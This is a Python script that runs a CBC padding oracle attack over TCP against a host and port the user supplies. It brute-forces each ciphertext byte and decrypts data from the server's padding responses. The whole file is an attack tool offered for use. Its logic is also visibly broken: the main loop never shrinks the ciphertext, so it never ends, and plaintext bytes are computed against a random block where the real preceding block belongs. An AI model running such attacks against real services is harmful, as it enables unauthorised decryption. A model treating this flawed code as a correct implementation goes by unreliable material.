import argparse
import random
from input_output import send_tcp_data

# 1. Function to handle command-line arguments
def parse_args():
    """
    This function defines the command-line arguments:
    - host (--host)
    - port (--port)
    - encrypted data to send (--data)
    """
    parser = argparse.ArgumentParser(description="Padding Oracle Attack using TCP")
    parser.add_argument('--host', required=True, help="Host for the TCP connection")
    parser.add_argument('--port', type=int, required=True, help="Port for the TCP connection")
    parser.add_argument('--data', required=True, help="Encrypted data to send (hexadecimal format)")
    return parser.parse_args()

# 2. Function to create a random block (Cn-1)
def create_random_block(block_size=16):
    """
    Create a random block of the specified size.
    """
    return bytearray(random.getrandbits(8) for _ in range(block_size))

# 3. Function to modify a block for the padding test
def modify_block_for_padding(block, byte_position, value, padding_size):
    """
    Modify a specific byte in the block to adjust the padding.
    
    Parameters:
    - block: The bytearray of the previous encrypted block (Cn-1).
    - byte_position: The position of the byte to modify (from the end of the block).
    - value: The value to set for the modified byte (0x00 to 0xFF).
    - padding_size: The padding size expected (1 for the last byte, 2 for the last two bytes, etc.).
    
    Returns:
    - A modified copy of the block with the byte changed.
    """
    modified_block = bytearray(block)  # Make a copy so we don't modify the original
    block_size = len(modified_block)
    
    # Modify the byte at the given position for padding
    modified_block[block_size - byte_position] = (modified_block[block_size - byte_position] ^ padding_size ^ value)
    
    # Adjust the bytes already decrypted to reflect the new padding size
    for j in range(1, byte_position):
        modified_block[block_size - j] ^= padding_size ^ (padding_size + 1)
    
    return modified_block

# 4. Function to find the correct padding byte by modifying the random block
def find_padding_byte(host, port, random_block, encrypted_data_final, i):
    """
    Test each byte for the padding oracle attack to find the correct one.
    """
    for moving_byte in range(0, 256):  # Test every possible value for the byte
        tmp_block = modify_block_for_padding(random_block, i, moving_byte, i)  # Modify the random block
        
        # Combine the modified random block with the final encrypted block to form the payload
        payload = tmp_block + encrypted_data_final
        print(f"Trying byte: 0x{moving_byte:02x} | Encrypted data sent: {payload.hex()}")

        # Send the encrypted data and receive the server's response
        if send_tcp_data(host, port, payload.hex()):
            print(f"Valid padding found for byte: 0x{moving_byte:02x}")
            return moving_byte
    
    # If no valid byte was found, return None (this would indicate a problem)
    return None

# 5. Main function to handle the Padding Oracle attack
def padding_oracle_attack(host, port, encrypted_data):
    """
    Main function for the Padding Oracle attack.
    It sends data over TCP and waits for the server's response.
    """
    decrypted = []
    encrypted_data = bytearray.fromhex(encrypted_data)  # Convert hex to bytearray for manipulation
    
    while len(encrypted_data) > 16:
        encrypted_data_final = encrypted_data[-16:]  # Last block to be decrypted (16 bytes)
        
        # Create a random block instead of using the actual previous block
        random_block = create_random_block()

        # Loop over each byte in the block (starting from the last byte)
        for i in range(1, 17):  # From last byte to first byte of the block
            padding_value = i  # For example, 1 for the last byte, 2 for the last two, etc.

            # Find the correct byte for this position using padding oracle attack
            found_byte = find_padding_byte(host, port, random_block, encrypted_data_final, i)

            if found_byte is not None:
                # XOR to get the plaintext byte: C'n-1[i] XOR i XOR Cn-1[i]
                plaintext_byte = found_byte ^ padding_value ^ random_block[-i]
                decrypted.append(plaintext_byte)
            else:
                print(f"No valid byte found for position {i}")
                break  # Break the loop if no byte was found, indicating an issue
            
    # Reverse the decrypted bytes to get the correct order
    decrypted.reverse()
    
    # Convert the decrypted byte array to a readable string
    decrypted_text = ''.join([chr(b) for b in decrypted])
    print(f"Decrypted text: {decrypted_text}")

if __name__ == "__main__":
    # 6. Retrieve arguments and start the attack
    args = parse_args()
    padding_oracle_attack(args.host, args.port, args.data)
